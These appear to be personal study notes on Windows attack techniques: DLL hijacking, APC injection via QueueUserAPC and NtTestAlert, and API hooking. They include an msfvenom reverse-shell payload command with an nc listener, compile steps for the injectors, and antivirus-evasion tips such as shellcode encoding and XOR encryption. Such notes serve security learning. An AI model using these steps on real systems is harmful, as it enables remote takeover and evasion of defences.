DLL HIJACKING
- DLL preloading Attack involves placing malicious code in windows
applications by exploiting the method by which DLLs are loaded.
- Programs require libraries to perform a variety of things(DLL)
- DLL hijacking security vulnerability that can lead to a legitimate
application to run malicious code.
- Attacker places malicious DLL in the directory an application searches
for a legitimate one and may load it if it has a similar name.


What is the DLL search order that windows uses?
1. Examines the directory the application was initiated
2. Scrutinizes the system directory located at c:\Windows\System32
3. Check the 16-bit system directory at C:\Windows\System
4. Investigate the Windows directory at C:\Windows
5. Assesses the current working directory
6. Explores the directories, as defined by the PATH environment variable

NOTE:The DLL you compile must export functions for the victim process to 
execute.



UNDERSTANDING APC INJECTION
- Asynchronous procedure call(APC) Injection 
- QueueUserAPC= utilizes an APC to queue a particular thread.
- Every thread has a separate APC queue.
- The QueueUserAPC function is invoked to queue an APC to a thread.
- APC queing is a request for the thread to invoke the APC function.


VirtualAlloc and VirtualAllocEx
- VirtualAlloc assigns memory within the process from which it is 
called while VirtualAllocEx assign memory within a separate process.

EXAMPLE:
Generate Shell:
    kali> msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.112 LPORT=4444 -f c
Compile on windows:
    cmd> g++ -o apc_injection.exe apc_injection.cpp -lws2_32
Set listener:
    kali> nc -nvlp 4444
RUN:
    cmd> apc_injection.exe
NOTE: Give it time to run!! Notepad.exe is in suspended mode does not show up.



APC INJECTION via NTTESTALERT
- This is a more practicle approach.
- We are going to use undocumented function known as NtTestAlert.
- Aim is to execute shellcode within a local process while using WIN32API function
called QueueUserAPC and an officially undocumented Native API known as NtTestAlert.
- NtTestAlert sys call is associated with the alerting mechanism of the windows 
operating system.
- Invoking this system has the potential to initiate the execution of any pending
APC's associated with a thread.
Compile:
    cmd> g++ -o undoc_apc_injection.exe undoc_apc_injection.cpp -lws2_32


MASTERING API HOOKING TECHNIQUES
What is API hooking?
- API hooking is used to alter the functionality and sequence of API calls.
- Used by AV to ID if a given program is malicious

For Evasion try:
    1. Shekati ga Nai encoding
    2. Xor encyption of the shellcode and decrypt only at run time

Compiling on LINUX:
┌──(kali㉿kali)-[~/windows_target]
└─$ # Compile the DLL
x86_64-w64-mingw32-g++ -shared -o pet.dll pet.cpp -luser32 -lkernel32 -static-libgcc -static-libstdc++

# Compile the executable
x86_64-w64-mingw32-g++ -o cat.exe cat.cpp -luser32 -lkernel32 -static-libgcc -static-libstdc++ -mconsole
                             
